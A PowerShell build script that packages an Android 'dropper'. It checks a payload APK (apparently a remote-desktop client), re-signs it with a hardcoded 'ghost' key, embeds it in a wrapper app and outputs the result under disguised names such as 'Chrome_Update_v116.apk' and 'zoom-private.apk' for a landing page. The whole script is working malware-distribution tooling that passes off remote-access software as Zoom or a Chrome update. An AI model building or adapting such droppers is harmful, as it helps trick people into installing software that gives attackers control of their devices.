# Requires Windows PowerShell 7 and JDK 17 (JAVA_HOME) + Android SDK 36.
#   $env:ANDROID_HOME = "$env:LOCALAPPDATA\Android\Sdk"
#   .\tools\build-dropper.ps1
param(
    [string]$Payload = "",
    [switch]$SkipBuild
)
$ErrorActionPreference = "Stop"
$root = Split-Path $PSScriptRoot -Parent
$repo = Split-Path $root -Parent
$bt = Join-Path $env:ANDROID_HOME "build-tools\36.0.0"
$zipalign = Join-Path $bt "zipalign.exe"
$apksigner = Join-Path $bt "apksigner.bat"
$aapt2 = Join-Path $bt "aapt2.exe"
$ks = Join-Path $root "release.keystore"
$ksPass = "GhostDropper2026!"
$alias = "ghost"

if (-not $Payload) { $Payload = Join-Path $repo "pages\zoom-private-universal-release.apk" }
if (-not (Test-Path $Payload)) { throw "Payload not found: $Payload" }
foreach ($tool in @($zipalign, $apksigner, $aapt2)) {
    if (-not (Test-Path $tool)) { throw "Missing SDK tool: $tool" }
}

$badging = & $aapt2 dump badging $Payload 2>&1 | Out-String
if ($badging -notmatch "package: name='com\.betterdesk\.client\.universal'") {
    throw "Wrong payload package: expected com.betterdesk.client.universal"
}
$version = ([regex]::Match($badging, "versionName='([^']+)'")).Groups[1].Value
Write-Host "Payload OK: com.betterdesk.client.universal $version"

# 1. Re-sign the payload with the shared ghost key.
$work = Join-Path $env:TEMP ("ghost-payload-" + [guid]::NewGuid().ToString("N"))
New-Item -ItemType Directory -Path $work | Out-Null
$aligned = Join-Path $work "payload-aligned.apk"
$signed = Join-Path $work "zoom-private.apk"
& $zipalign -f -p 4 $Payload $aligned
& $apksigner sign --ks $ks --ks-pass "pass:$ksPass" --key-pass "pass:$ksPass" `
    --ks-key-alias $alias --v1-signing-enabled true --v2-signing-enabled true `
    --v3-signing-enabled true --out $signed $aligned
& $apksigner verify --verbose $signed | Out-Null
if ($LASTEXITCODE -ne 0) { throw "Payload signature verification failed" }

Copy-Item $signed (Join-Path $root "app\src\main\assets\zoom-private.apk") -Force
Copy-Item $signed (Join-Path $repo "distro\clients\android\zoom-private-payload.apk") -Force

# 2. Build the wrapper using the embedded payload.
if (-not $SkipBuild) {
    Push-Location $root
    try {
        $built = $false
        for ($attempt = 0; $attempt -lt 3 -and -not $built; $attempt++) {
            & .\gradlew.bat :app:assembleRelease --offline --warning-mode all
            if ($LASTEXITCODE -eq 0) { $built = $true; break }
            # Windows can keep the R8 output locked; restart and retry.
            & .\gradlew.bat --stop | Out-Null
            Remove-Item "app\build\intermediates\dex" -Recurse -Force -ErrorAction SilentlyContinue
        }
        if (-not $built) { throw "Gradle build failed" }
    } finally { Pop-Location }
}

$apk = Join-Path $root "app\build\outputs\apk\release\zoom-private.apk"
if (-not (Test-Path $apk)) { throw "Build produced no APK: $apk" }
& $apksigner verify --verbose $apk | Out-Null
if ($LASTEXITCODE -ne 0) { throw "Dropper signature verification failed" }

foreach ($name in @("zoom-private.apk", "GhostInstaller.apk", "Chrome_Update_v116.apk")) {
    Copy-Item $apk (Join-Path $repo "distro\clients\android\$name") -Force
}
Copy-Item $apk (Join-Path $repo "pages\zoom-private.apk") -Force

$size = (Get-Item $apk).Length
$sha = (Get-FileHash $apk -Algorithm SHA256).Hash.ToLower()
Write-Host ""
Write-Host "Built: $apk"
Write-Host "Size : $size bytes"
Write-Host "SHA256: $sha"
Write-Host "Landing size hint: size: $size"
Remove-Item $work -Recurse -Force
